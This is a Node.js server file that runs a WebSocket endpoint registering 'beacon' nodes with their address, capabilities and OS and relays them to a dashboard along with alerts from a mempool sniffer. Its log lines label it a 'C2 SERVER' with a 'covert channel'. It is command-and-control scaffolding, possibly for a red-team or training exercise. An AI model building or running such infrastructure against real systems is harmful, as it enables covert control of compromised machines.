import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import { createServer } from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import { coordinatorRouter } from './server/routes/coordinator.js';
import { snifferRouter } from './server/routes/sniffer.js';
import { coordinator } from './server/core/coordinator.js';
import { sniffer } from './server/core/mempool-sniffer.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const server = createServer(app);
  const wss = new WebSocketServer({ server });
  const PORT = 3000;

  app.use(express.json());

  // WebSocket Event Bus
  wss.on('connection', (ws) => {
    console.log('[WSS] New covert channel established.');
    
    ws.on('message', (data) => {
      try {
        const message = JSON.parse(data.toString());
        if (message.type === 'beacon') {
          const { id, address, capabilities, os } = message.data;
          const result = coordinator.registerBeacon(id, address, capabilities, os);
          ws.send(JSON.stringify({ type: 'beacon_ack', data: result }));
        }
      } catch (e) {
        console.error('[WSS] Malformed message received');
      }
    });
  });

  // Relay Core Events to WS Clients (Dashboard)
  coordinator.on('beacon', (node) => {
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({ type: 'node_update', data: node }));
      }
    });
  });

  sniffer.on('alert', (alert) => {
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({ type: 'soc_alert', data: alert }));
      }
    });
  });

  // API Routes
  app.use('/api/coordinator', coordinatorRouter);
  app.use('/api/sniffer', snifferRouter);

  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  server.listen(PORT, '0.0.0.0', () => {
    console.log(`[C2 SERVER] Running on http://localhost:${PORT}`);
    console.log(`[WSS] Covert channel active on port ${PORT}`);
  });
}

startServer();
